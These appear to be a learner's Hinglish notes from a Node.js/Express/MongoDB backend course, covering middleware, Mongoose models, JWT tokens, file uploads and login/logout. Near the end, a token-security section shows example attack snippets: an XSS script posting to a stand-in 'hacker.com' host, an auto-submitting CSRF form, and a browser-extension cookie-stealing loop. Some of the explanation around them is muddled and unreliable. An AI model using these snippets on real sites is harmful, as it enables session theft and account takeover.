# Lession 1 ( What is backend? )


- Jab tum return default karke bhejto ho to koi bhi naam se accept kar sakte ho aur import {} lagane ke zarurat ni lekin agar kisi aur tareqe ser return karte ho to lagan padega
- Default Export: export default variable → Import with any name, no {}  ( Ham default tb karte hai jab sara bhejna ho content to seedhe kisi bhi naam se import kar sakte)
- Named Export: export const variable → Import with exact name, must use {}  ( is case mein ham kai varibales ya function export karte hai to unhe {} destructure karna hi padega )

- Import x from 'y' ka matlab hai saara y de do as x, import {x} from 'y' -> y se x lake do sirf
- Backend development woh kaam hai jo website ya app ke "parde ke peeche" (behind the curtains) hota hai. Jab aap koi app use karte hain, jo kuch bhi aapko dikhta nahi hai, par kaam karwata hai, woh sab backend hai.

- Jaise Sochiye: Aap Zomato app kholte ho. Aapko restaurants dikhte hain, menu dikhta hai. Yeh sab Frontend hai (jo aap dekhte ho).
- Lekin jab aap koi dish search karte ho, toh woh data kahan se aata hai? Aapka order kaise save hota hai? Payment kaise process hoti hai? Aapko notification kaise aata hai? Yeh sab Backend ka kaam hai.
- Backend Developer Kya Karta Hai? (Backend ka Kaam)
Ek backend developer mainly teen cheezein banata aur manage karta hai:

1. **Server (The Machine)**

- Yeh ek powerful computer hai jo hamesha internet se connected rehta hai.
- Isi par aapka app/website ka code host hota hai.
- Backend developer is server ko manage karta hai ki woh efficiently kaise kaam kare.

2. **Application (The Business Logic)**

Yeh woh code hai jismein aapke app ka asli dimag (logic) hota hai.

Examples:

- "Agar user 'Login' button dabaye, toh uska email aur password database se check karo."
- "Agar user ne product 'Add to Cart' kiya, toh us product ko uske cart mein daalo."
- "User ne jo city search ki hai, us city ke saare restaurants dikhao."
- Iske liye programmers languages use karte hain jaise: Python, Java, PHP, C#, Node.js (JavaScript ka backend version), Ruby, Go.

3. **Database (The Storage)**

- Yeh ek organized tarika hai saari information ko store karne ka.
- Isi mein users ka data (name, email, password), products ki details, orders ki history, sab kuch save rehta hai.
- Examples: MySQL, PostgreSQL, MongoDB, Firebase.
- Backend developer decide karta hai ki data kaise store hoga aur phir need padne par kaise retrieve kiya jaayega.

![Backend-Architecture](./images/backend-archi.png)

**Note - DB hamesha doosre continent mein hota hai**


### JS Based backend

- You will handle data, file and third party ( API )
- A JS runtime : NodeJS/Deno/Bun

#### Directory Structure

- src has index( DB connection),  APP( configuration , cookies, urlencoder) , constants ( enums, DB-name )
- DB - Database connection code
- Models - Sample of your db table
- Controllers - Functionality
- Routes - Routing of ur api
- Middleware - 
- Utils - File upload, email sending ( utilities )
- More ( depends )

![directory-structure](./images/directory-structure.png)

# Lession 2 ( Simple Project )

### Express JS

- Express.js (or simply Express) is the most popular Node.js web application framework, designed for building web applications and APIs.
- It's often called the de facto standard server framework for Node.js.

Key Characteristics:

- Minimal and flexible
- Unopinionated (you decide how to structure your app)
- Lightweight and fast
- Extensible through middleware
- Huge ecosystem of plugins and extensions

Two ways of importing files

- const express = require('express') ( CommonJS)
- import express from 'express' (Module)
- Kabhi kabhi issue ata hai to package.json mein jake 'type' key bana do ( module ya commonjs value ke saath)

### CORS Issue

- Ya to whitelist kardo backend mein
- Ya proxy laga do - wo har bundler ke liye alag step hoga 
- proxy kya karta hai 

```jsx

server: {
    proxy: {
      '/api' : 'http://localhost:4000'
    }
  }

- agar koi request /api se shuru hoti hai to uske age automatically http://localhost:4000 ye  lag jaega
- to server ko lagega ki ye to same origin se request a rhi hai to data de dega

- Hamara backend runs on port 4000 and frontend on 3000

Browser Request: http://localhost:4000/api/users
    ↓
Proxy Intercepts: "Aha! '/api' dekha!"
    ↓
Redirects to: http://localhost:4000/api/users
    ↓
Backend Response: JSON data
    ↓
Proxy Returns: Same data to frontend

```

# Lession 3 ( How backend is started? )

- Sabse pehle data kaise store ho rha hai backend mein uski chinta karo
- sketch out the fields you want in your db ( frontend wagerah ban jaega )
- Sabse pehle data modelling karo

![data-model](./images/data-model.png)

- Ise data ko model karne ke liye **mongooses** use karte

#### Data Modelling best practices

- Create a models folder 
- Then create a folder for your model
- Then Create a model using this naming convention (model_name.models.js) not compulsory but good to write like this


```javascript
// Step 1 import mongoose
import mongoose from "mongoose";

// Step 2 create a schema
const userSchema = new mongoose.Schema({})

// Step 3 export this schema ( create a model)
export const User=mongoose.model("User",userSchema)
```

- **Note : mongoDB mein users naam se store hoga ( lowercase + s lag jata hai)**


### Foreign key reference in mongoose

```jsx
createdBy: {
        type: mongoose.Schema.Types.ObjectId,
        ref: 'User'
    },
    subTodos: [
        {
            type: mongoose.Schema.Types.ObjectId,
            ref: 'SubTodo'
        }
    ]// Array of subtodos
```

### Images

- Store them somewhere in the cloud and get the url
- you can store images directly too but not recommended

### Agar limited options chahiye

```jsx
// Limited options
    status:{
        type: String,
        enum: ['PENDING',"CANCELLED","DELIVERED"],
        default: 'PENDING'
    }
```


# Lession 4 ( Mega Project Starts )

- to push empty folders to git use .gitkeep(an empty file) inside the folder
- **nodemon** - server ko restart kr deta hai changes mein
- lekin use nodemon as dev dependency ( production mein ni jaega)
- **Prettier** - Ye common syntax bana deta hai code ka , jaise single qutoe use ni honge, spaces two tabs ki hongi etc etc
- Jisse team same page pe rahti hai
- create two files .prettierrc ( config file) and .prettierignore ( files where you dont want prettier to do anything (Ex- node modules , .env etc))

### DB connectivity

TWO MOST IMPORTANT THINGS TO NOTE

- DB operations should always be wrapped inside **try catch**
- DB is another continent so use **async await** ( basically treat it as asynchronous code)

Two ways of connecting

1) first file mein jo load hogi ( index app whatever usi mien db connect kardo)

```javascript
';' kyun JS ko batane ke liye semicolon ke baad naya cheeze shuru hui hai
agar ni hota to isse ata read karna ho to notes padhna wahan hai iska concept

- Han function banake function ko call bhi kar sakte ho iife agar na use karna ho

;(async () => {
    try {
        await mongoose.connect(`${process.env.MONGODB_URL}/${DB_NAME}`)
        app.on('error',(error)=>{
            console.log("APP not able to talk to mongo ERROR: ",error);
            throw error
        })

        app.listen(process.env.PORT, ()=>{
            console.log(`App is listening on port ${PORT}`)
        })
    } catch (error) {
        console.log("Error:",error);
        throw error
    }
})()


```

2. Alag db folder banake usmein se karo jo karna hai

```javascript

dbConnection.js

import mongoose from "mongoose";
import { DB_NAME } from "../constants.js";


const connectDB = async () =>{
    try {
        const connectionInstance=await mongoose.connect(`${process.env.MONGODB_URL}/${DB_NAME}`)

        // console.log(connectionInstance);
        
        console.log(`\n MongoDB connected !! DB Host ${connectionInstance.connection.host}`);
        
    } catch (error) {
        console.log("MONGODB connection error",error);
        throw error

        // or you can use process.exit(1)
    }
}

export default connectDB

index.js

// require('dotenv').config({path: './env'})

import dotenv from 'dotenv'
import connectDB from './db/index.js'

dotenv.config({ path: './.env' })

connectDB()
```

**NOTE:**

- dotenv ko sabse pehle load karo jaise kiya hai
- path de do ki kahan se env lena


### Setting Configurations 

- we use app.use() for middlewares and any cofigurations modification
- async await hamesha return value promise mein wrap karke return karta hai
- **Setting up cors**

    // **app.use(cors())** // kaam to ho gaya lekin aur bhi options hote hai
    app.use(cors({
        origin: process.env.CORS_ORIGIN,
        credentials: true
    }))

- **Adding configurations** 
    1. ( Data multiple source se aega isliye kuch settings banaenge)
    2. Rate limiting bhi add karenge
    3. **express.json()** middleware request body mein se JSON data parse karta hai 
    4. URL se data ( URL mein cheezein badalte rahte hai //, %20 for space etc to in sab ko encode karke batana padta hai)
    **app.use(express.urlencoded({extended:true,limit:'16kb'}))**
    
        ismein extended ki madad se obj ke andar obj bhej paenge
    aur limit to samjh gae hoge

    5. For static files like favicon,img jo main apne server mein hi store karna chahta hun
    **app.use(express.static("public"))**
    
        yaad karo public folder banaya hai isliye banaya hai
    6. cookiParser is used to perform CRUD operations on the cookies of the user's browser
    **app.use(cookieParser)**


### Middlewares

- Middleware ek aisa "bridge" ya "gatekeeper" hota hai jo request aane se pehle aur response jaane se pehle beech ka kaam karta hai.

Socho aap ek restaurant mein order de rahe ho:

Normal Flow:

- Aap order karte ho (Client Request)
- Waiter kitchen mein order lekar jaata hai
- Chef khana banata hai (Server Process)

- Waiter khana laake deta hai (Server Response)

Middleware wala Flow:

- Aap order karte ho (Request)

Waiter check karta hai:

- Kya aapne table book kiya hai? (Authentication Middleware)
- Kya aap VIP customer ho? (Authorization Middleware)
- Kya order sahi format mein hai? (Validation Middleware)
- Order ko notepad mein likhta hai (Logging Middleware)
- Fir hi kitchen mein order bhejta hai

Khana banne ke baad bhi waiter:

- Presentation check karta hai (Formatting Middleware)
- Bill add karta hai (Processing Middleware)
- Tab jaake khana aapko milta hai (Response)

![middleware](images/middleware.png)

- **Note**

    - Hamare pass routes ke callback function mein (req,res) sirf ni hota hai 
    (err,req,res,next) bhi hota
    - next bas ek flag hai middlewares ke liye ( man lo 2 middleware hai jab pehle execute hoga to next use karke doosre ko call kardega aur fir doosra jab apna kaam kar lega to response wagerah send kar dega)

```jsx

// Middleware 1
app.use((req, res, next) => {
    console.log("Middleware 1: Request aaya");
    next(); // ✅ "Aage badho, next middleware ko call karo"
});

// Middleware 2  
app.use((req, res, next) => {
    console.log("Middleware 2: Authentication check");
    if (req.user) {
        next(); // ✅ "Aage badho"
    } else {
        res.send("Login karo!"); // ❌ "Yahi ruko, response bhejdo"
    }
});

// Final Route
app.get('/home', (req, res) => {
    res.send("Welcome to home!"); // ✅ "Response bhejdo"
});

```

### Important Concept ( AsyncHandler Concept )

- Ham kai baar db wali call karenge matlab wo function call karenge
- To ham chahte hai uske upar ek wrapper bana dein jismein hum function pass karenge aur wo execute karke de dega
- Dekho ek cheez aur hai ki baar baar try catch bhi likhna padega in db operations ( to code messy aur repeated hoga) isliye bhi iska use karte hai

### Explanation First

- Dekho bhai ye samjna thora mushkil hai time lag sakta hai lekin main notes bana rha ki samjh ae tumhe step by step


```jsx
function ab(req,res){
   // code
}
app.get('/', ab)
```

- Ye normal express ka code hota hai agreed??
- jb hit hoga tb call karenge ab man lo main is ab fn ko kisi aur fn ko de dun to kaise karoge 

```jsx
// Option 1
function anotherFn ( ab ){
    return ab()
}

// Option 2
function anotherFn( ab ){
    return function(req,res){
        ab()
    }
}
```

- tum khud hi batao option 1 mein to seedhe execute ho jaega
- option 2 mein seedhe ni hoga jab koi endpoint hit karega tbahi hoga
- Thik ek dikkat solve hui ab ye req,res ka kya scene hai 
- dekho bhai express ko to aisa format chahiye

```jsx
app.get('path',(req,res)=>{})
```
- to tumhe aisa hi kuch return bhi to karna hoga na
- Bas wahi kar rhe ho ( req,res) ki jagah (a,b) , ( hello, world) kuch bhi de do wo tumahri marzi


### Actual Code

#### Type 1
```jsx
const asyncHandler = (fn) => {
    return async (err,req,res,next) => {
        try{
            await fn(err,req,res,next)
        }catch(error){
            res.status(error.code || 500)
            .json({
                success: false,
                message: err.message
            })
        }
    }
}
```


#### Type 2
```jsx
const asyncHandler =  (requestHandler) => {
    return (req,res,next)=>{
        Promise.resolve(requestHandler(req,res,next)).catch((err)=>next(err))
    }
}
```

### Very Important Concepts ( Kai doubt clear karega ye )

```jsx

1. Middleware Kya Hai?


// ✅ Bridge jo request-response ke beech kaam karta hai
app.use((req, res, next) => {
    console.log("Middleware running");
    next(); // Aage badho
});


2. AsyncHandler Ka Concept

// ✅ Automatic error handling wrapper
const asyncHandler = (fn) => {
    return (req, res, next) => {
        Promise.resolve(fn(req, res, next)).catch(next);
    };
};



3. Error Handling Magic

// ✅ Normal Middleware (3 parameters)
app.use((req, res, next) => {
    // Yahan directly throw kar sakte ho
    throw new Error("Something went wrong!");
});

// ✅ Error Handler (4 parameters) - LAST mein
app.use((err, req, res, next) => {
    res.status(500).json({ error: err.message });
});
```
### Note - 

**Bhai har jagah ye (err,req,res,next) na likhna kyunki kya hota hai agar tumne err dal diya ( wo normally errorHandler use karta hai) to tumne jis jis middleware ya util mein err use kiya hoga express ko lagega ki ye error handler hai to actual jab call aegi us middleware ki to wo skip ho jaega, aur similary jab error raise hoga kahin to express confuse ho jaega kaunsa error handler hai aur kaunsa ni to hamesha properly use karna aur haan eror handler last mein use karo pehle ni**

```jsx


4. Parameter Count Matters!


// Express parameter count se pata lagata hai:
(req, res, next)    → 3 params = NORMAL middleware  
(err, req, res, next) → 4 params = ERROR handler


5. Next() Ke Types

next();          // ✅ Normal flow continue
next(error);     // ✅ Error forward karo  
next('route');   // ✅ Current route skip karo
next('router');  // ✅ Complete router skip karo


6. Throw Ka Use

// ✅ Express routes mein directly throw kar sakte ho
app.get('/api', (req, res) => {
    throw new Error("Error message!"); // No try-catch needed
    // Express automatically catch karega
});

```

- express mein tum seedhe throw kar sakte ho errors without using try catch hn try catch bhi use kar sakte ho lekin express automatically thrown error ko errohandler pe bhej dega
- try mein tum throw karo na karo koi bhi exception ya eror apne ap catch mein jaegi


### Status Codes

- Informational responses (100 – 199)
- Successful responses (200 – 299)
- Redirection messages (300 – 399)
- Client error responses (400 – 499)
- Server error responses (500 – 599)


### User and Video Model

- for enabling searching field in an optimised way use this {index: true} in model
- **bcrypt** used for hasing password
- **JSON web token** - crypto graphy ke madad se token ban jata hai
- Mongoose hame kai hook deta hai jaise pre etc 
- iska matlab data ke sath kuch hone se just pehle ye kardo
- hamare case mein data save hone se pehle pass hash kardo

```jsx

📄 DOCUMENT HOOKS
Pre Hooks:
javascript
schema.pre('save', function(next) { })
schema.pre('validate', function(next) { })
schema.pre('remove', function(next) { })
schema.pre('deleteOne', function(next) { })
Post Hooks:
javascript
schema.post('save', function(doc, next) { })
schema.post('validate', function(doc, next) { })
schema.post('remove', function(doc, next) { })
schema.post('deleteOne', function(doc, next) { })
🔍 QUERY HOOKS
Pre Hooks:
javascript
schema.pre('find', function(next) { })
schema.pre('findOne', function(next) { })
schema.pre('findById', function(next) { })
schema.pre('findOneAndUpdate', function(next) { })
schema.pre('findOneAndDelete', function(next) { })
schema.pre('updateOne', function(next) { })
schema.pre('updateMany', function(next) { })
schema.pre('deleteMany', function(next) { })
schema.pre('count', function(next) { })
schema.pre('countDocuments', function(next) { })
Post Hooks:
javascript
schema.post('find', function(docs, next) { })
schema.post('findOne', function(doc, next) { })
schema.post('findById', function(doc, next) { })
schema.post('findOneAndUpdate', function(doc, next) { })
schema.post('findOneAndDelete', function(doc, next) { })
schema.post('updateOne', function(result, next) { })
schema.post('updateMany', function(result, next) { })
schema.post('deleteMany', function(result, next) { })
📊 AGGREGATE HOOKS
javascript
schema.pre('aggregate', function(next) { })
schema.post('aggregate', function(result, next) { })
🏢 MODEL HOOKS
javascript
schema.pre('insertMany', function(next, docs) { })
schema.post('insertMany', function(docs, next) { })

```

**Note**: Tumne notice kiya hoga ki ham yahan normal function likh rhe arrow function ni  ( kyunki hame this ka access chahiye aur arrow function mein to this ka issue hota hai)

### Video 10 - JWT ( Refresh and Access token)

- JWT is a "Bearer Token" ka matlab hai: "Jis ke paas ye token hai, usi ko access milega"
- Jaise: "Jis ke paas train ticket hai, wahi train mein baith sakta hai"

- Refresh and Access token Ye dono use karte hai  ( dono JWT hi hai bas use different hai)
- Access token jo hai uski expiry kam hoti hai
- Refresh token ki expiry lambi hoti hai
- We create Key and expiry in env
- Ab access token generateKarne ka function bhi bana lo models mein

```jsx

TOKEN AISA HOTA HAI

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsImlhdCI6MTUxNjIzOTAyMn0.KMUFsIDTnFmyG3nMiGM6H9FNFUROf3wh7SmqJp-QV30

aur decoded value

{
  "sub": "1234567890",
  "name": "John Doe",
  "admin": true,
  "iat": 1516239022
}

```
# Video 11 ( File Upload )

- File handling apne servers par ni kari jati normally 
- External services use hoti hai production mein
- Cloudinary use kar rhe hai ham 
- fir **express-fileuload** ya fir **multer** se ham file operations kar sakte hai

### Cloudinary
- Steps of File Upload
    - Ham user se file lene using multer and store them in our local server
    - after that with the help of cloudinary we will take that file and upload on the cloudinary's server
    - Why this two steps??
    - // Pehle local mein check kar sakte hain
    - // Agar Cloudinary upload fail ho to retry kar sakte hain
    - // Local file pe extra processing kar sakte hain


### Multer
- multer servers as a middleware here aur jab bhi aisa upload wala kuch hoga to we will use it
- middleware kahta hai jab bhi jana mujhse milke jana
- Ham multer mein disk storage use kar rhe hai lekin memory storage ka bhi option hai
- But memory bhar sakti hai jaldi isliye we dont use that option


# Video 12 ( HTTP )

- Hyper Text Transfer Protocol
- HTTPs vs HTTP ( HTTPs mein data encrypt hoke jata hai , aur HTTP mein simple plain text jata hai)
- URI,URL,URN

**HTTP Headers**

- metadata ( Data ka data ) -> key-value pairs sent along with request and response
- Some headers - caching, authentication, manage state

- Request Headers -> from Client
- Response Headers -> from server
- Representation Headers -> encoding/compression
- Payload Headers -> data

```jsx
🎯 HTTP Status Codes (Server Responses):

1xx - Information (Process Chal Raha Hai):

100 Continue - "Order sun liya, bhejta rah"
101 Switching Protocols - "Language change kar raha hun"
102 Processing - "Order pak raha hai, thoda time lagega"
103 Early Hints - "Ye cheeze pehle se ready rakh lo"


2xx - Success (Sab thik hai):

200 OK - "Order mil gaya"
201 Created - "Naya order create ho gaya" 
204 No Content - "Order complete, kuch return nahi"

3xx - Redirection (Idhar udhar bhejna):

301 Moved Permanently - "Dukaan shift ho gayi"
302 Found - "Temporarily dusre address pe"
304 Not Modified - "Cache mein same hai, naya nahi lao"

4xx - Client Error (Customer ki galti):

400 Bad Request - "Galat order format"
401 Unauthorized - "Pehle login karo"
403 Forbidden - "Permission nahi hai"
404 Not Found - "Item nahi mila"
429 Too Many Requests - "Itne orders mat karo"

5xx - Server Error (Server ki galti):

500 Internal Server Error - "Kitchen mein problem hai"
502 Bad Gateway - "Server baat nahi kar pa raha"
503 Service Unavailable - "Server busy hai"
```
![headers-http](/images/headers-http.png)


### HTTP Methods

Basic set of operations that can be use to interact with server. Some methods

![http-methods](/images/http-methods.png)

# Video 13 ( Routes and Controller )

- Controllers hai sirf logic logic logic
- Routes ham production mein app.js mein likhte hai 
- ham app mein app.get/post ni lihenge ab ai to ab middleware ka use karenge aur app.use likhenge

# Video 14 ( Register User Logic)

- Steps 
    - get user details from frontend ( postman in our case)
    - validation ( VV imporant ) - not empty ek example
    - check if user already exists : username, email
    - check if images,check for avatar
    - upload to cloudinary , check for avatar for sure
    - get the url
    - create user object - and create entry in the db
    - remove password and refresh token field from response and give it back to frontend
    - check for user creation is successful or not ( properly create hua ki ni)
    - return res

- Actual Code
    - Get the data from req body
    - use multer code in routes for inputting the files
    - multer hame req.files ka option de deta hai
    - uske baad poora algorithm follow karo user controller main

# Video 15 ( Setup Postman )

- Collection banake kaam karte hai
- Environment variable bana lo jaise ki maine url ka banaya because wo common hai har request mein
- Folder structure banake use karna for professional use

# Video 16 ( Tokens )

- Difference between Access and Refresh tokens?
    - Everything same with the difference in their expiry
    - Access token kam validity while refresh token zyada validity
    - **Access** Token: A **short-lived** credential used to access protected resources (like an API or a user's data). It is like a temporary key card that grants direct entry.
    - **Refresh** Token: A **long-lived **credential used solely to obtain a new Access Token. It is like a permanent, secure voucher that you exchange for a new temporary key card when the old one expires.

### Access Token

- Primary Purpose: To grant direct access to protected resources.	
- Lifespan: Short-lived (e.g., 1 hour).	
- Security Risk: Lower. Its short validity limits the damage if stolen.	Higher. 
- Frequency of Use: Used frequently Sent with every API request to a protected resource.


- Primary Purpose: To obtain a new Access Token without re-authentication.
- Lifespan: Long-lived (e.g., 7 days, 30 days).
- Security Risk: Its long validity allows an attacker to get new Access Tokens repeatedly.
- Frequency of Use: Used infrequently, only when a new Access Token is needed.


### How they are used?

- Login karte ho: Server ek Access Token (1 ghante ka) aur ek Refresh Token (7 din ka) deta hai.
- Kaam chalta rahta hai: Har API call ke saath Access Token bhejte ho.
- 1 Ghanta baad: Access Token invalid ho jata hai. Server bolta hai, "Bhai, yeh token mar gaya, naya lao."
- Naya Token lena: App automatically server ko Refresh Token bhejegi aur kahegi, "Bhaiya, isko verify karo aur ek fresh Access Token de do."
- Phir se kaam shuru: Naya Access Token milte hi, tumhari app phir se normal kaam karna shuru kar deti hai.


## Login User Steps

- req body se data lo
- username or email se find karo user
- password check karo
- generate access and refresh token
- send secure cookies

### Notes

- Jo hamne custom methods likhe hain jaise ki generate token
- password matchi etc etc
- Wo hame jo instance return karega mongoose usse access honge na ki Mongoose object se directly
- Ex - User hamara model tha aur uske andar tumne helloWorld() function dala hai

```jsx
User.helloWorld() - galat

const user=User.findOne('key') 
user.helloWorld() ye work karega
```

- why user.save({validateBeforeSave: false}) not user.save()

```jsx

user.save() // Ye pehle check karega: 
            // - Email sahi hai kya?
            // - Password strong hai kya?
            // - Saare required fields hain kya?
            // Agar koi problem hai toh ERROR dega

user.save({validateBeforeSave: false}) 
// Ye seedha database mein save karega:
// - Koi checking nahi karega
// - Direct save karega
// - Koi validation error nahi aayega
```

### Very Important Note

```jsx

1. Cookies Mein (Security & Convenience)

.cookie('accessToken',accessToken,options)
.cookie('refreshToken',refreshToken,options)


- Automatic Storage: Browser automatically har request ke saath cookies bhejega
- Security: HttpOnly, Secure flags se XSS attacks se bachata hai
- Convenience: Client ko manually token store/attach karne ki zaroorat nahi

2. JSON Response Mein (Flexibility)

.json(
    new ApiResponse(200,{
        user: loggedInUser, accessToken, refreshToken
    },"User Logged in Successfully")
)

Kyun?

- Mobile Apps: Mobile apps cookies use nahi kar sakte, unko direct tokens chahiye
- Different Clients: Koi client cookies nahi use karta (e.g., mobile, desktop apps)
- Backup: Agar cookies clear ho jaaye, toh client paas tokens hain
- Multiple Storage: Client choose kar sakta hai kahan store karna hai (localStorage, asyncStorage, etc.)

3. User Data Bhi (Complete Information)

user: loggedInUser

Kyun?

- Immediate Use: Client ko user data mil jaata hai, alag se API call ki zaroorat nahi
- Better UX: Login ke baad directly user profile show kar sakte hain

```

### Logout user 

- Ismein ek dikkat hai ki user kaunsa hai ye kaise pata chalega
- To we create a custom middleware for this auth middleware
- ismein // req main cookie kaise laga pa rhe?
- // kyunki hamne app mein wo middleware dal diya hai cookie parse wala ( req aur res dono mein access hai)

```jsx

const token = req.cookies?.accessToken || req.header('Authorization')?.replace('Bearer ', '');
// Ye Authorization wali line ek standard hai
// Authorization (key) : Bearer {token_value} (value)
// to ham 'Bearer ' ko hata rahe aur sirf token le rhe


// ismein first wala to samjh gae hoge wo to hamne cookie mein dala hua tha isliye access kar pa rhe
// Doosra wala mobile device aur aise device jinke pass cookie ka option ni hai
// yaad karo login ke end main hamne json response bheja tha wo inhi devices ke liye hai

```

- Mujhe ek doubt aya the ki hamne jab login kiya tab cookie mein access aur refresh dono bheja lekin jab logout kiya tab accesstoken ka hi use kiya
- Also hame ye pata hai ki refreshToken mil gya to dikkat ho sakti to ye sab security measures ke bawjood kaise issue a rha

```jsx

1. XSS (Cross-Site Scripting) Attack
javascript
// Agar app mein XSS vulnerability hai:
// Attacker malicious script inject kar sakta hai:
<script>
fetch('https://hacker.com/steal', {
    method: 'POST',
    credentials: 'include' // ❌ Cookies automatically include honge
});
</script>

// Browser automatically cookies bhej dega attacker ke server ko
// HttpOnly bhi kaam nahi aayega kyunki browser automatically bhej raha hai
2. CSRF (Cross-Site Request Forgery)
javascript
// Attacker fake form bana sakta hai:
<form action="https://yourapp.com/delete-account" method="POST">
    <input type="hidden" name="confirm" value="yes">
</form>
<script>document.forms[0].submit();</script>

// Browser automatically cookies include karega
// User ko pata bhi nahi chalega
3. Man-in-the-Middle Attack
javascript
// Agar:
// - User public WiFi use kar raha hai
// - HTTPS properly implement nahi hai
// - Certificate issues hain

// Attacker network traffic intercept kar sakta hai:
// Request: GET /api/user/profile
// Headers: Cookie: accessToken=xxx; refreshToken=xxx ❌ Pakda gaya!
4. Browser Extensions
javascript
// Malicious browser extension access kar sakta hai:
chrome.cookies.getAll({}, function(cookies) {
    cookies.forEach(function(cookie) {
        // ❌ Har cookie including your tokens access ho sakta hai
        sendToAttackerServer(cookie);
    });
});
5. Physical Access
javascript
// Kisi ko physical access mil gaya computer ka:
// - Browser developer tools open karke
// - Copy cookies from Application tab
// - Use stolen tokens from different machine
6. Server-Side Vulnerabilities
javascript
// Agar server pe log files bana rahe hain:
console.log('Request cookies:', req.cookies);
// ❌ Log files mein tokens save ho sakte hain

// Ya response mein accidentally expose:
res.json({
    user: user,
    cookies: req.cookies // ❌ GALTI se cookies expose!
});

```


# Video 17 ( Testing of Login and Logout)

- 
